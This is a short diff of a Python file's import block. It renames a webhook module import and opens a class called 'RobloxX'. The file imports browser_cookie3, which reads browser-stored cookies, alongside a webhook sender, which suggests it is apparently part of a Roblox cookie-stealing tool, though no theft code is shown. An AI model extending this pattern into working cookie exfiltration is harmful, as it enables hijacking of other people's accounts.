@@ -1,7 +1,7 @@
 import requests
 import browser_cookie3
 from config import Config
-from __webhook import _WebhookX
+from webhook import _WebhookX
 
 class RobloxX():
     
